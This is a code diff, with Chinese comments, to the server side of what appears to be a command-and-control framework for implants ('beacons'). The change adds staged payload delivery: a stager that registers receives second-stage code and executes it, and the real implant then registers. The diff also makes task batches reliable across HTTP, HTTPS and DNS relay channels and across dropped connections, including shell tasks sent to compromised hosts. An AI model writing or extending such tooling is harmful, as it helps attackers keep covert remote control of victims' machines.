@@ -28,8 +28,8 @@ from server.core.events import (
 from server.core.log import get_logger
 from .base import handshake, send_welcome, send_error, SessionError
 from .engine import (
-    register_beacon, store_result, build_auto_tasks, drain_tasks,
-    batch_response, InFlight,
+    register_beacon, store_result, build_auto_tasks,
+    take_task_batch, batch_response, InFlight,
 )
 
 logger = get_logger("beacon_session")
@@ -149,37 +149,54 @@ class BeaconSession:
                 self._tq.push(client_id, task)
                 self._events.emit(EVT_AUTO_CMD_SENT, client_id,
                                   task_id=task.task_id)
+            # 分段载荷: stage_code(第二段)随首次下发——引导代码(agent_stager)
+            # 注册后收到 init 任务即 exec, 之后真植入物以同 id 继续注册
+            if self._config.stage_code:
+                from server.task_queue import Task
+                self._tq.push(client_id, Task(
+                    code=self._config.stage_code, is_init=True,
+                    task_id="stage"))
+                self._events.emit(EVT_AUTO_CMD_SENT, client_id,
+                                  task_id="stage")
 
-        # ③ 一次性下发全部 pending 任务（按字节预算分批,acked 首批携带）
-        tasks = drain_tasks(client_id, self._tq)
+        # ③ 每次会话只取一批(单帧字节预算),剩余任务留在队列、下次回连再取。
+        # 旧实现 drain 全量 + 拆多帧:无状态中继(agent_http/https/dns 的
+        # relay_tx 每请求只读一帧就断连)第 2 帧起全部静默丢失;TCP 中途断线
+        # 也只回放失败帧、后续帧已出队无人回放(2026-08-27 实测丢任务)。
+        # 单批必单帧:中继通道一轮一帧正好,队列剩余下次轮询拉取。
         budget = max(4096, int(self._config.max_frame_size * 0.8))
-        for frame in batch_response(acked, tasks, budget):
-            for t in frame["tasks"]:
-                # 用 task_id 找回原 Task 对象登记处理器(批量帧只带 id/code)
-                for orig in tasks:
-                    if orig.task_id == t["task_id"]:
-                        self._inflight.track(orig)
-                        break
+        tasks = take_task_batch(client_id, self._tq, budget)
+        if tasks:
+            for t in tasks:
+                self._inflight.track(t)  # 用原 Task 对象登记处理器(含 proc_arg)
+            frame = batch_response(acked, tasks, budget)[0]  # 单批 → 单帧
             try:
                 send_frame(self._sock,
                            json.dumps({"type": TASKS, **frame}).encode("utf-8"),
                            self._key)
             except Exception:
-                # 断线: 本批任务逆序 push_front 保序,下次回连重发
-                for t in reversed(frame["tasks"]):
-                    from server.task_queue import Task
-                    self._tq.push_front(client_id,
-                                        Task(code=t["code"], task_id=t["task_id"]))
+                # 断线: 本批逆序 push_front 回放原 Task(保留 result_processor/
+                # proc_arg/is_init/record 标记),下次回连重发
+                for t in reversed(tasks):
+                    self._tq.push_front(client_id, t)
                 return
-            for t in frame["tasks"]:
-                self._events.emit(EVT_TASK_SENT, client_id, task_id=t["task_id"])
+            for t in tasks:
+                self._events.emit(EVT_TASK_SENT, client_id, task_id=t.task_id)
             # shell 文本任务 exit/break 已确认下发: 立即复位 is_shell,
             # 消除退出后到下次基础注册之间的误路由窗口
-            if any(t["code"].strip() in ("exit", "break")
-                   for t in frame["tasks"]):
+            if any(t.code.strip() in ("exit", "break") for t in tasks):
                 rec = self._mgr.get_client(client_id)
                 if rec is not None:
                     rec.is_shell = False
+        else:
+            # 无任务: 仍要发一帧空 TASKS 作为结果确认回执(acked)
+            try:
+                send_frame(self._sock,
+                           json.dumps({"type": TASKS, "tasks": [],
+                                       "acked": list(acked)}).encode("utf-8"),
+                           self._key)
+            except Exception:
+                return
 
         # ④ 结束本周期（implant 断开,本地执行任务）
         try:
